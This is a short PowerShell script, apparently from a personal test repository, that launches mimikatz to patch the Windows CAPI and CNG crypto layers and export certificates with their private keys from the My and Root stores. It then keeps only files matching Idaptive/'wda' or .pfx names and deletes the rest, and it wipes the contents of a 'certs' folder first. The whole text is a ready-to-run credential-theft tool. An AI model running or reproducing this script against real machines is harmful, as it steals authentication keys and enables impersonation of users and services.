$Mimikatz_Path = "C:\Users\daniel\Downloads\Testing_moshe-main\Testing_moshe-main\x64\mimikatz.exe"
$Param0 = "crypto::capi"
$Param1 = "crypto::cng"
$Param2 = "crypto::certificates /store:My /export"
$Param3 = "crypto::certificates /store:Root /export"
$Param4 = "crypto::certificates /store:My /export"
$Param5 = "exit"
$command = "$Mimikatz_Path `"$Param0`" `"$Param1`" `"$Param2`" `"$Param3`" `"$Param4`" `"$Param5`""
$FolderName = "certs"

if (Test-Path $FolderName) {
	Set-Location $FolderName
	Remove-Item * -Recurse
	
} else {
	New-Item -ItemType Directory -Path $FolderName | Out-Null
	Set-Location $FolderName
}

Invoke-Expression $command

# Get the list of items in the current directory and Loops through each items
$items = Get-ChildItem

foreach ($item in $items) {
	if ($item.Name -match "wda|idaptive|pfx") {
		Write-Host "[+] $($item.Name) has wda or idaptive in its name, keeping it."
	} else {
	Remove-Item $item.FullName -Force
	Write-Host "[-] $($item.Name) does not have moshe or moshe1 in its name, removing it."
	}}